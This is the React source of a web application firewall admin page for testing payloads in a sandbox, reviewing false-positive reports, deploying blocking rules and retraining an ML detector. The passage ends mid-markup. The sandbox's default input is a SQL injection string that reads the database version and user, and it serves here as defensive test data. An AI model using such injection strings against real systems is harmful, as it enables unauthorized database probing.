import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import {
  Brain,
  ShieldCheck,
  ShieldAlert,
  AlertTriangle,
  CheckCircle2,
  RotateCw,
  Search,
  Plus,
  Trash2,
  Play,
  CheckSquare,
  Code,
  Sparkles,
  Filter,
  ArrowRight,
  FlaskConical,
  Database,
  Inbox,
  Shield,
  Zap,
  Cpu,
  Layers,
  Copy,
  Check,
  X,
  FileCode,
  ExternalLink,
  Clock
} from 'lucide-react'
import api from '../api/api'
import adminStore from '../utils/adminStore'
import { copyToClipboard } from '../utils/clipboard'

export default function AttackLearning() {
  const cachedStats = adminStore.get('learning_stats')
  const [stats, setStats] = useState(cachedStats)
  const [loading, setLoading] = useState(!cachedStats)
  const [activeTab, setActiveTab] = useState('sandbox') // 'sandbox' | 'reports' | 'dataset'

  // Reports state
  const [reports, setReports] = useState([])
  const [reportsFilter, setReportsFilter] = useState('all')
  const [reportsSearch, setReportsSearch] = useState('')
  const [reportsLoading, setReportsLoading] = useState(false)

  // Dataset state
  const [samples, setSamples] = useState([])
  const [samplesFilter, setSamplesFilter] = useState('all')
  const [samplesSearch, setSamplesSearch] = useState('')
  const [samplesLoading, setSamplesLoading] = useState(false)

  // Sandbox state
  const [sandboxPayload, setSandboxPayload] = useState("UNION SELECT 1, @@version, user() --")
  const [sandboxUrl, setSandboxUrl] = useState("/products?id=1")
  const [sandboxMethod, setSandboxMethod] = useState("GET")
  const [sandboxTesting, setSandboxTesting] = useState(false)
  const [sandboxResult, setSandboxResult] = useState(null)

  // Modals & Action States
  const [selectedReport, setSelectedReport] = useState(null)
  const [whitelistModalOpen, setWhitelistModalOpen] = useState(false)
  const [whitelistForm, setWhitelistForm] = useState({ name: '', pattern: '', match_type: 'contains', description: '', target_payload: '' })

  const [blacklistModalOpen, setBlacklistModalOpen] = useState(false)
  const [blacklistForm, setBlacklistForm] = useState({ name: '', pattern: '', category: 'SQL Injection', severity: 'critical', action: 'block', target_payload: '' })

  const [addSampleModalOpen, setAddSampleModalOpen] = useState(false)
  const [sampleForm, setSampleForm] = useState({ payload: '', label: 1, category: 'SQL Injection', notes: '' })

  const [retraining, setRetraining] = useState(false)
  const [notification, setNotification] = useState(null)
  const [copiedId, setCopiedId] = useState(null)

  const showNotification = (msg, type = 'success') => {
    setNotification({ msg, type })
    setTimeout(() => setNotification(null), 4500)
  }

  const handleCopy = (id, text) => {
    copyToClipboard(text)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 1800)
  }

  // Fetch metrics & initial tab data
  const loadStats = async (showLoading = false) => {
    if (showLoading) setLoading(true)
    try {
      const res = await api.adminGetLearningStats()
      if (res.data) {
        setStats(res.data)
        adminStore.set('learning_stats', res.data)
      }
    } catch (err) {
      console.error("Failed to load learning stats:", err)
    } finally {
      setLoading(false)
    }
  }

  const loadReports = async () => {
    setReportsLoading(true)
    try {
      const params = {}
      if (reportsFilter !== 'all') params.status = reportsFilter
      if (reportsSearch) params.q = reportsSearch
      const res = await api.adminGetLearningReports(params)
      setReports(res.data?.reports || [])
    } catch (err) {
      showNotification("Failed to fetch reports", "error")
    } finally {
      setReportsLoading(false)
    }
  }

  const loadSamples = async () => {
    setSamplesLoading(true)
    try {
      const params = {}
      if (samplesFilter !== 'all') params.label = samplesFilter
      if (samplesSearch) params.q = samplesSearch
      const res = await api.adminGetLearnedSamples(params)
      setSamples(res.data?.samples || [])
    } catch (err) {
      showNotification("Failed to fetch dataset samples", "error")
    } finally {
      setSamplesLoading(false)
    }
  }

  useEffect(() => {
    loadStats(!adminStore.get('learning_stats'))
  }, [])

  useEffect(() => {
    if (activeTab === 'reports') loadReports()
    if (activeTab === 'dataset') loadSamples()
  }, [activeTab, reportsFilter, samplesFilter])

  // ==================== ACTIONS ====================

  const handleDeployFleetAttackRule = async (payload, ruleName) => {
    if (!payload) return
    try {
      const cleanPattern = payload.length < 50 
        ? `(?i)(${payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`
        : `(?i)(${payload.slice(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`
      
      await api.adminCreateVirtualPatch({
        rule_type: 'custom_rule',
        cve_id: `RULE-RAPID-${Math.floor(1000 + Math.random() * 9000)}`,
        name: ruleName || `Rapid Blocker for ${payload.slice(0, 30)}...`,
        category: sandboxResult?.attack_type || 'Custom Attack',
        component: 'fleet-waf',
        target_scope: 'all',
        pattern: cleanPattern,
        action: 'block',
        severity: 'critical',
        is_active: true
      })
      showNotification("Fleet Attack Rule deployed and synchronized across all sites!", "success")
      loadStats()
    } catch (err) {
      showNotification(err.message || "Failed to deploy fleet rule", "error")
    }
  }

  const handleOpenWhitelistModal = (report = null, defaultPattern = '') => {
    setSelectedReport(report)
    setWhitelistForm({
      report_id: report?.id || null,
      name: report ? `WL: ${report.reference_id}` : 'Custom Whitelist Rule',
      pattern: defaultPattern || report?.payload || report?.url || '',
      match_type: report?.payload ? 'contains' : 'url_path',
      description: report ? `Whitelisted from user report ${report.reference_id}` : '',
      target_payload: report?.payload || defaultPattern || '',
    })
    setWhitelistModalOpen(true)
  }

  const handleWhitelistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminWhitelistPattern(whitelistForm)
      showNotification("Pattern whitelisted & benign ML sample recorded! False-positive 403 resolved.")
      setWhitelistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
    } catch (err) {
      showNotification(err.message || "Failed to whitelist pattern", "error")
    }
  }

  const handleOpenBlacklistModal = (report = null, defaultPayload = '') => {
    setSelectedReport(report)
    setBlacklistForm({
      report_id: report?.id || null,
      name: report ? `RULE-${report.reference_id}` : `RULE-ATTACK-${Math.floor(1000 + Math.random() * 9000)}`,
      pattern: defaultPayload || report?.payload || '',
      category: report?.attack_type || 'SQL Injection',
      severity: 'critical',
      action: 'block',
      target_payload: report?.payload || defaultPayload || '',
    })
    setBlacklistModalOpen(true)
  }

  const handleBlacklistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminBlacklistAndLearn(blacklistForm)
      showNotification("Attack pattern blacklisted & labeled for ML continuous training!")
      setBlacklistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Failed to blacklist pattern", "error")
    }
  }

  const handleDeleteReport = async (reportId) => {
    if (!window.confirm("Dismiss and delete this report?")) return
    try {
      await api.adminDismissReport(reportId)
      showNotification("Report dismissed")
      loadReports()
      loadStats()
    } catch (err) {
      showNotification("Failed to dismiss report", "error")
    }
  }

  const handleRunSandbox = async (e) => {
    if (e) e.preventDefault()
    if (!sandboxPayload.trim()) return
    setSandboxTesting(true)
    try {
      const res = await api.adminRunSandboxTest({
        payload: sandboxPayload,
        url_path: sandboxUrl,
        method: sandboxMethod,
      })
      setSandboxResult(res.data)
    } catch (err) {
      showNotification("Sandbox evaluation failed: " + err.message, "error")
    } finally {
      setSandboxTesting(false)
    }
  }

  const handleRetrainModel = async () => {
    if (!window.confirm("Trigger incremental WAF ML model fine-tuning with all learned dataset samples?")) return
    setRetraining(true)
    try {
      const res = await api.adminRetrainWafModel()
      showNotification(res.message || `WAF ML Model updated to v${res.data?.new_version}!`)
      loadStats()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Retraining failed", "error")
    } finally {
      setRetraining(false)
    }
  }

  const handleAddSampleSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminAddLearnedSample(sampleForm)
      showNotification("Sample added to active dataset")
      setAddSampleModalOpen(false)
      setSampleForm({ payload: '', label: 1, category: 'SQL Injection', notes: '' })
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification(err.message || "Failed to add sample", "error")
    }
  }

  const handleDeleteSample = async (id) => {
    if (!window.confirm("Delete this sample from the training dataset?")) return
    try {
      await api.adminDeleteLearnedSample(id)
      showNotification("Sample removed from dataset")
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete sample", "error")
    }
  }

  const sendToSandbox = (payload, url = '/') => {
    setSandboxPayload(payload)
    setSandboxUrl(url)
    setActiveTab('sandbox')
    setTimeout(() => {
      handleRunSandbox()
    }, 150)
  }

  return (
    <div style={{ maxWidth: '100%', boxSizing: 'border-box' }}>
      {/* Toast Alert */}
      {notification && (
        <div style={{
          position: 'fixed',
          bottom: '24px',
          right: '24px',
          zIndex: 9999,
          background: notification.type === 'error' ? '#DC2626' : '#0F172A',
          color: '#FFFFFF',
          padding: '10px 18px',
          borderRadius: '8px',
          boxShadow: '0 10px 25px -5px rgba(0,0,0,0.2)',
          fontSize: '12.5px',
          fontWeight: '600',
          display: 'flex',
          alignItems: 'center',
          gap: '8px'
        }}>
          {notification.type === 'error' ? <AlertTriangle size={15} /> : <CheckCircle2 size={15} color="#34D399" />}
          <span>{notification.msg}</span>
        </div>
      )}

      {/* TOP HEADER STRIP — Compact & Clean (100% Logs.jsx Match) */}
      <div style={{
        background: '#FFFFFF',
        borderRadius: '10px',
        border: '1px solid #D9E1DC',
        padding: '10px 16px',
        marginBottom: '10px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        flexWrap: 'wrap',
        gap: '10px'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <span style={{
            fontSize: '11px',
            fontWeight: '700',
            letterSpacing: '0.04em',
            textTransform: 'uppercase',
            color: '#2563EB',
            background: '#EFF6FF',
            border: '1px solid #DBEAFE',
            padding: '3px 10px',
            borderRadius: '20px',
            display: 'inline-flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            <Brain size={12} />
            <span>AI Model Center</span>
          </span>
          <span style={{ fontSize: '13px', fontWeight: '700', color: '#10201E' }}>
            Attack Evasion Lab &amp; Continuous Learning
          </span>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <Link
            to="/admin/rules"
            style={{
              padding: '6px 14px',
              borderRadius: '6px',
              background: '#EFF6FF',
              border: '1px solid #BFDBFE',
              color: '#1D4ED8',
              fontSize: '12.5px',
              fontWeight: '700',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              textDecoration: 'none'
            }}
          >
            <Shield size={13} />
            <span>View Fleet Rules & Patches ↗</span>
          </Link>

          <button
            type="button"
            onClick={handleRetrainModel}
            disabled={retraining}
            style={{
              padding: '6px 14px',
              borderRadius: '6px',
              background: '#2563EB',
              border: '1px solid #1D4ED8',
              color: '#FFFFFF',
              fontSize: '12.5px',
              fontWeight: '700',
              cursor: retraining ? 'not-allowed' : 'pointer',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px'
            }}
          >
            <RotateCw size={13} className={retraining ? 'animate-spin' : ''} />
            <span>{retraining ? 'Fine-Tuning ML Model...' : 'Retrain WAF Model Now'}</span>
          </button>
        </div>
      </div>

      {/* COMPACT KPI CARDS (100% Logs.jsx Match) */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))', gap: '8px', marginBottom: '14px' }}>
        <div style={{
          background: '#FFFFFF',
          borderRadius: '8px',
          border: '1px solid #D9E1DC',
          padding: '8px 12px',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
        }}>
          <div style={{
            width: '24px',
            height: '24px',
            borderRadius: '6px',
            background: '#FBFCFA',
            border: '1px solid #D9E1DC',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            flexShrink: 0
          }}>
            <Inbox size={13} color="#D97706" />
          </div>
          <div>
            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              Pending Reports
            </div>
            <div style={{ fontSize: '17px', fontWeight: '700', color: '#D97706', lineHeight: '1.1', marginTop: '1px' }}>
              {stats?.reports?.pending || 0}
            </div>
          </div>
        </div>

        <div style={{
          background: '#FFFFFF',
          borderRadius: '8px',
          border: '1px solid #D9E1DC',
          padding: '8px 12px',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
        }}>
          <div style={{
            width: '24px',
            height: '24px',
            borderRadius: '6px',
            background: '#FBFCFA',
            border: '1px solid #D9E1DC',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            flexShrink: 0
          }}>
            <ShieldAlert size={13} color="#DC2626" />
          </div>
          <div>
            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              Learned Attack Rules
            </div>
            <div style={{ fontSize: '17px', fontWeight: '700', color: '#DC2626', lineHeight: '1.1', marginTop: '1px' }}>
              {stats?.rules?.learned_blocking_rules || 0}
            </div>
          </div>
        </div>

        <div style={{
          background: '#FFFFFF',
          borderRadius: '8px',
          border: '1px solid #D9E1DC',
          padding: '8px 12px',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
        }}>
          <div style={{
            width: '24px',
            height: '24px',
            borderRadius: '6px',
            background: '#FBFCFA',
            border: '1px solid #D9E1DC',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            flexShrink: 0
          }}>
            <Database size={13} color="#059669" />
          </div>
          <div>
            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              ML Dataset Samples
            </div>
            <div style={{ fontSize: '17px', fontWeight: '700', color: '#059669', lineHeight: '1.1', marginTop: '1px' }}>
              {stats?.dataset?.total_samples || samples.length || 0}
            </div>
          </div>
        </div>

        <div style={{
          background: '#FFFFFF',
          borderRadius: '8px',
          border: '1px solid #D9E1DC',
          padding: '8px 12px',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
        }}>
          <div style={{
            width: '24px',
            height: '24px',
            borderRadius: '6px',
            background: '#FBFCFA',
            border: '1px solid #D9E1DC',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            flexShrink: 0
          }}>
            <Cpu size={13} color="#2563EB" />
          </div>
          <div>
            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              WAF ML Model Version
            </div>
            <div style={{ fontSize: '17px', fontWeight: '700', color: '#10201E', lineHeight: '1.1', marginTop: '1px' }}>
              v{stats?.model_status?.model_version || '2.4.0'}
            </div>
          </div>
        </div>
      </div>

      {/* 3-STEP ADAPTIVE PIPELINE GUIDE */}
      <div style={{
        background: '#FFFFFF',
        border: '1px solid #D9E1DC',
        borderRadius: '10px',
        padding: '12px 16px',
        marginBottom: '16px'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Sparkles size={14} style={{ color: '#2563EB' }} />
            <h4 style={{ margin: 0, fontSize: '13px', fontWeight: '700', color: '#0F172A' }}>
              Continuous Adaptive Security Pipeline (Threat Simulation & AI Studio)
            </h4>
          </div>
          <span style={{ fontSize: '11.5px', color: '#64748B' }}>Real-time evaluation &amp; zero-downtime retraining</span>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '8px' }}>
          <div
            onClick={() => setActiveTab('sandbox')}
            style={{
              background: activeTab === 'sandbox' ? '#EFF6FF' : '#FBFCFA',
              border: '1px solid ' + (activeTab === 'sandbox' ? '#93C5FD' : '#D9E1DC'),
              borderRadius: '8px',
              padding: '10px 12px',
              cursor: 'pointer',
              transition: 'all 0.15s ease'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>1</span>
              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>Interactive Attack Sandbox &amp; Rapid Blocker</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
              Simulate zero-day attacks live against AST, ML, and Rules. 1-Click deploy fleet blocking rules instantly.
            </p>
          </div>

          <div
            onClick={() => setActiveTab('reports')}
            style={{
              background: activeTab === 'reports' ? '#EFF6FF' : '#FBFCFA',
              border: '1px solid ' + (activeTab === 'reports' ? '#93C5FD' : '#D9E1DC'),
              borderRadius: '8px',
              padding: '10px 12px',
              cursor: 'pointer',
              transition: 'all 0.15s ease'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>2</span>
              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>User 403 Feedback &amp; False-Positive Ingestion</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
              Review blocked requests reported by legitimate users. Click <strong>1-Click Whitelist</strong> to resolve.
            </p>
          </div>

          <div
            onClick={() => setActiveTab('dataset')}
            style={{
              background: activeTab === 'dataset' ? '#EFF6FF' : '#FBFCFA',
              border: '1px solid ' + (activeTab === 'dataset' ? '#93C5FD' : '#D9E1DC'),
              borderRadius: '8px',
              padding: '10px 12px',
              cursor: 'pointer',
              transition: 'all 0.15s ease'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>3</span>
              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>ML Training Dataset &amp; AI Fine-Tuning</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
              Curated corpus of Safe (0) vs Attack (1) samples. Click <strong>Retrain Model Now</strong> to fine-tune AI.
            </p>
          </div>
        </div>
      </div>

      {/* TABS NAVIGATION BAR */}
      <div style={{
        display: 'flex',
        gap: '6px',
        marginBottom: '16px',
        borderBottom: '1px solid #D9E1DC',
        paddingBottom: '2px'
      }}>
        {[
          { id: 'sandbox', label: 'Interactive Attack Sandbox & Rapid Blocker', icon: FlaskConical },
          { id: 'reports', label: 'User False-Positive Reports', icon: Inbox, badge: stats?.reports?.pending },
          { id: 'dataset', label: `ML Training Dataset (${stats?.dataset?.total_samples || samples.length || 0})`, icon: Database }
        ].map(tab => {
          const Icon = tab.icon
          const isActive = activeTab === tab.id
          return (
            <button
              key={tab.id}
              type="button"
              onClick={() => setActiveTab(tab.id)}
              style={{
                padding: '9px 16px',
                borderRadius: '8px 8px 0 0',
                border: 'none',
                background: isActive ? '#FFFFFF' : 'transparent',
                color: isActive ? '#2563EB' : '#64748B',
                fontWeight: '700',
                fontSize: '13px',
                cursor: 'pointer',
                borderBottom: isActive ? '2.5px solid #2563EB' : '2.5px solid transparent',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px'
              }}
            >
              <Icon size={14} />
              <span>{tab.label}</span>
              {tab.badge > 0 && (
                <span style={{
                  background: isActive ? '#EFF6FF' : '#FEF3C7',
                  color: isActive ? '#1D4ED8' : '#B45309',
                  border: isActive ? '1px solid #DBEAFE' : '1px solid #FDE68A',
                  padding: '1px 6px',
                  borderRadius: '10px',
                  fontSize: '10.5px',
                  fontWeight: '800'
                }}>
                  {tab.badge}
                </span>
              )}
            </button>
          )
        })}
      </div>

      {/* ==================== TAB 1: REPORTS & FEEDBACK ==================== */}
      {activeTab === 'reports' && (
        <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', overflow: 'hidden' }}>
          {/* Controls Bar */}
          <div style={{ padding: '12px 16px', borderBottom: '1px solid #D9E1DC', background: '#FBFCFA', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
            <div style={{ display: 'flex', gap: '6px' }}>
              {['all', 'pending', 'whitelisted', 'blacklisted'].map(st => (
                <button
                  key={st}
                  onClick={() => setReportsFilter(st)}
                  style={{
                    padding: '5px 12px',
                    borderRadius: '6px',
                    border: '1px solid ' + (reportsFilter === st ? '#93C5FD' : '#D9E1DC'),
                    background: reportsFilter === st ? '#EFF6FF' : '#FFFFFF',
                    color: reportsFilter === st ? '#1D4ED8' : '#60716B',
                    fontWeight: '700',
                    fontSize: '11.5px',
                    cursor: 'pointer',
                    textTransform: 'capitalize'
                  }}
                >
                  {st}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '6px', flex: '1 1 260px', maxWidth: '360px' }}>
              <div style={{ position: 'relative', width: '100%' }}>
                <Search size={13} style={{ position: 'absolute', left: '10px', top: '50%', transform: 'translateY(-50%)', color: '#94A3B8' }} />
                <input
                  type="text"
                  placeholder="Search reference, IP, URL..."
                  value={reportsSearch}
                  onChange={e => setReportsSearch(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && loadReports()}
                  style={{ width: '100%', padding: '6px 10px 6px 30px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', boxSizing: 'border-box' }}
                />
              </div>
              <button
                type="button"
                onClick={loadReports}
                style={{ padding: '6px 12px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#60716B', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
              >
                <RotateCw size={13} />
              </button>
            </div>
          </div>

          {/* Reports List */}
          {reportsLoading ? (
            <div style={{ textAlign: 'center', padding: '50px', color: '#94A3B8' }}>
              <RotateCw size={24} className="animate-spin" style={{ margin: '0 auto 8px', display: 'block' }} />
              <p style={{ margin: 0, fontSize: '13px' }}>Loading reports...</p>
            </div>
          ) : reports.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '50px 20px', color: '#64748B' }}>
              <ShieldCheck size={32} style={{ color: '#059669', margin: '0 auto 8px', display: 'block' }} />
              <h3 style={{ margin: '0 0 4px', color: '#0F172A', fontSize: '15px' }}>No Pending Reports in Queue</h3>
              <p style={{ color: '#64748B', fontSize: '12px', margin: 0 }}>All user feedback and false positive requests have been reviewed.</p>
            </div>
          ) : (
            <div style={{ padding: '14px 16px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
              {reports.map(r => (
                <div key={r.id} style={{ background: '#FFFFFF', border: '1px solid #D9E1DC', borderRadius: '8px', padding: '14px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '8px' }}>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                        <span style={{
                          padding: '2px 8px',
                          borderRadius: '12px',
                          fontSize: '11px',
                          fontWeight: '700',
                          textTransform: 'uppercase',
                          background: r.status === 'pending' ? '#FEF3C7' : r.status === 'whitelisted' ? '#ECFDF5' : '#FEF2F2',
                          color: r.status === 'pending' ? '#B45309' : r.status === 'whitelisted' ? '#059669' : '#DC2626',
                          border: '1px solid ' + (r.status === 'pending' ? '#FDE68A' : r.status === 'whitelisted' ? '#A7F3D0' : '#FECACA')
                        }}>
                          {r.status}
                        </span>
                        <strong style={{ fontSize: '13px', color: '#0F172A', fontFamily: "'JetBrains Mono', monospace" }}>REF: {r.reference_id}</strong>
                        <span style={{ fontSize: '12px', color: '#64748B' }}>Client IP: <code style={{ color: '#0F172A', fontFamily: "'JetBrains Mono', monospace" }}>{r.client_ip}</code></span>
                        <span style={{ fontSize: '12px', color: '#64748B' }}>User: {r.user_email || 'Anonymous'}</span>
                      </div>
                      <div style={{ fontSize: '12px', color: '#475569', marginTop: '6px' }}>
                        <strong>Target Path:</strong> <code style={{ fontFamily: "'JetBrains Mono', monospace", background: '#F8FAFC', padding: '2px 6px', borderRadius: '4px' }}>{r.url}</code> &bull; <strong>Triggered:</strong> <span style={{ color: '#DC2626', fontWeight: '700' }}>{r.reason || r.attack_type}</span>
                      </div>
                    </div>

                    <div style={{ fontSize: '11.5px', color: '#94A3B8' }}>
                      {r.created_at?.slice(0, 19)}
                    </div>
                  </div>

                  {r.comments && (
                    <div style={{ marginTop: '8px', fontSize: '12px', padding: '6px 10px', background: '#EFF6FF', borderRadius: '6px', borderLeft: '3px solid #3B82F6', color: '#1E3A8A' }}>
                      <strong>User Note:</strong> {r.comments}
                    </div>
                  )}

                  {r.payload && (
                    <div style={{ marginTop: '8px' }}>
                      <div style={{ fontSize: '11px', fontWeight: '700', color: '#60716B' }}>REPORTED BLOCKED PAYLOAD / QUERY:</div>
                      <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: '11.5px', padding: '6px 10px', background: '#F8FAFC', borderRadius: '6px', border: '1px solid #D9E1DC', color: '#0369A1', wordBreak: 'break-all', marginTop: '3px' }}>
                        {r.payload}
                      </div>
                    </div>
                  )}

                  {/* 1-Click Action Hub */}
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '10px', paddingTop: '10px', borderTop: '1px solid #F1F5F9', flexWrap: 'wrap', gap: '6px' }}>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      <button
                        onClick={() => handleOpenWhitelistModal(r)}
                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <ShieldCheck size={13} />
                        <span>1-Click Whitelist (Fix 403)</span>
                      </button>
                      <button
                        onClick={() => handleOpenBlacklistModal(r)}
                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#DC2626', color: '#FFFFFF', border: 'none', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <ShieldAlert size={13} />
                        <span>Blacklist as Attack &amp; Learn</span>
                      </button>
                      <button
                        onClick={() => sendToSandbox(r.payload || r.url, r.url)}
                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#475569', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <FlaskConical size={13} />
                        <span>Test in Sandbox</span>
                      </button>
                    </div>

                    <button
                      onClick={() => handleDeleteReport(r.id)}
                      style={{ padding: '5px 10px', borderRadius: '6px', background: '#FEF2F2', border: '1px solid #FECACA', color: '#DC2626', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '4px' }}
                    >
                      <Trash2 size={13} />
                      <span>Dismiss</span>
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ==================== TAB 2: INTERACTIVE SANDBOX ==================== */}
      {activeTab === 'sandbox' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '14px' }}>
          {/* Input Form */}
          <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', padding: '16px 20px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
              <FlaskConical size={18} style={{ color: '#2563EB' }} />
              <h3 style={{ margin: 0, fontSize: '15px', color: '#0F172A', fontWeight: '800' }}>Live Attack Sandbox &amp; Evaluator</h3>
            </div>
            <p style={{ fontSize: '12px', color: '#64748B', marginBottom: '14px' }}>
              Simulate live WAF inspection across Semantic AST, Regex Signatures, and Neural ML classifier.
            </p>

            <form onSubmit={handleRunSandbox}>
              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
                  Request Path
                </label>
                <input
                  type="text"
                  value={sandboxUrl}
                  onChange={e => setSandboxUrl(e.target.value)}
                  placeholder="/api/v1/search?q="
                  style={{ width: '100%', padding: '7px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
                  HTTP Method
                </label>
                <select
                  value={sandboxMethod}
                  onChange={e => setSandboxMethod(e.target.value)}
                  style={{ width: '100%', padding: '7px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontWeight: '600', boxSizing: 'border-box' }}
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                  <option value="DELETE">DELETE</option>
                </select>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
                  Payload / Query Parameter String
                </label>
                <textarea
                  rows={4}
                  required
                  value={sandboxPayload}
                  onChange={e => setSandboxPayload(e.target.value)}
                  placeholder="Enter suspicious query, SQLi, script tag, or payload..."
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <button
                type="submit"
                disabled={sandboxTesting}
                style={{
                  width: '100%',
                  padding: '9px',
                  borderRadius: '6px',
                  background: '#2563EB',
                  border: '1px solid #1D4ED8',
                  color: '#FFFFFF',
